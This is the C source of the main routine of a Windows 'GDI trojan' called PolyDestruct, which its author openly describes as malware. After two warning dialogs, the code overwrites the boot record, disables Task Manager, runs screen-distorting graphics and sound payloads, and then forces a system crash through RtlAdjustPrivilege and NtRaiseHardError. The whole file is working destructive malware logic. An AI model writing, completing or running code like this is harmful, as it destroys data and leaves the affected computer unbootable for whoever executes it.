#include "PolyDestruct.h"
#include "Destructive.h"
#include "Payloads.h"

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	if (MessageBoxA(NULL, "The software you have just executed is considered malware.\r\nPolyDestruct will harm your computer and make it unusable.\r\n\r\nIf you are seeing this without knowledge of what you have just executed, simply press No.\r\nIf you're feeling a little adventurous, hit Yes and let PolyDestruct corrupt your PC.\r\nIf you are running it on real hardware, shut it down and delete this file quickly!\r\nTubercomiosis is not responsible for any damages made using this trojan!\r\n\r\nDo you want to execute it?", "GDI-Trojan.Win32.PolyDestruct", 4 | 48 | 4096 | MB_DEFBUTTON2) == IDNO) {
		return 0;
	}
	else
	{
		if (MessageBoxA(NULL, "THIS IS THE FINAL WARNING!!!\r\n\r\nTHE AUTHOR OF THIS MALWARE IS NOT RESPONSIBLE EVEN FOR THE SLIGHTEST BIT OF DAMAGE TO YOUR COMPUTER!\r\nIF YOU ARE RUNNING IT ON REAL HARDWARE, HIT NO AND REMOVE THIS FILE AS SOON AS POSSIBLE!!!\r\n\r\nPROCEED WITH EXECUTION ANYWAY?", "Last chance.", 4 | 48 | 4096 | MB_DEFBUTTON2) == IDNO) {
			return 0;
		}
		else
		{
			OverwriteBootRecord();
			DisableTaskManager();
			Sleep(8000);
			HANDLE icons = CreateThread(0, 0, Icons, 0, 0, 0);
			HANDLE ws1 = CreateThread(0, 0, wSound1, 0, 0, 0);
			Sleep(1000);
			HANDLE ws2 = CreateThread(0, 0, wSound2, 0, 0, 0);
			Sleep(1000);
			HANDLE ws3 = CreateThread(0, 0, wSound3, 0, 0, 0);
			HANDLE msg = CreateThread(0, 0, msgbox, 0, 0, 0);
			Sleep(10000);
			HANDLE cur = CreateThread(0, 0, CursorDraw, 0, 0, 0);
			Sleep(2000);
			HANDLE cur2 = CreateThread(0, 0, MoveCursor, 0, 0, 0);
			Sleep(27000);
			dt(cur);
			dt(ws1);
			dt(ws2);
			dt(ws3);
			HANDLE gdi1 = CreateThread(0, 0, PatBlt1, 0, 0, 0);
			Sound1();
			Sleep(20000);
			dt(gdi1);
			HANDLE gdi2 = CreateThread(0, 0, PatBit, 0, 0, 0);
			HANDLE gdi2b = CreateThread(0, 0, MirrorScreen, 0, 0, 0);
			Sound2();
			Sleep(35000);
			HANDLE gdi3 = CreateThread(0, 0, Tunneling, 0, 0, 0);
			HANDLE gdi3b = CreateThread(0, 0, InvCC, 0, 0, 0);
			HANDLE gdi3c = CreateThread(0, 0, PolyShapes, 0, 0, 0);
			Sound3();
			Sleep(18000);
			HANDLE gdi3d = CreateThread(0, 0, TextOuts, 0, 0, 0);
			Sleep(20000);
			BOOLEAN bl;
			unsigned long rsp;
			RtlAdjustPrivilege(19, true, false, &bl);
			NtRaiseHardError(0xC0000023, 0, 0, 0, 6, &rsp);
			Sleep(-1);
		}
	}
}
